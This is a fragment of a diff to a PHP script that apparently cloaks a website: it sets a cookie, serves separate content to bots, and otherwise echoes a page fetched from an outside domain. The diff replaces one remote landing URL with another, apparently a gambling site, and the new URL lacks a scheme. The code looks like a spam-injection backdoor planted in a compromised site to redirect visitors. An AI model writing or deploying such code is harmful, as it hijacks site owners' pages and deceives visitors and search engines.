@@ -9,7 +9,7 @@ setcookie('az', 'lp', time() + 3600 * 7200);
 echo ' '; // Your bot-specific content
 exit;
 }
-echo file_get_contents("https://slebew.xyz/landing/publishing/");
+echo file_get_contents("akeses-sumseltoto.com/minion/tukangmalin.html");
 exit;
 ?>
 <?php
